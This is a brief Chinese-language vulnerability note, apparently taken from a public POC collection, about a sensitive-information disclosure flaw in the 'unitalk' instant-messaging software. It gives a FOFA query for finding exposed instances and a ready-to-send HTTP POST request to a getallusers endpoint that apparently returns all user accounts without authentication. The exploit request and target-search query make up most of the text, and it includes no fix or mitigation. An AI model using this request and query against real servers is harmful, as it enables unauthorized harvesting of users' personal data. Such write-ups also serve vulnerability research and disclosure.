# unitalk存在敏感信息泄露漏洞

# 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在敏感信息泄露漏洞

# 二、影响版本
+ unitalk

# 三、资产测绘
+ fofa`title="unitalk"`
+ 特征


# 四、漏洞复现
```plain
POST /unitalk/v1.0/user/getallusers.json HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35
Content-Type: application/json;charset=UTF-8

{}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xwkb6kvo30rpcip8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
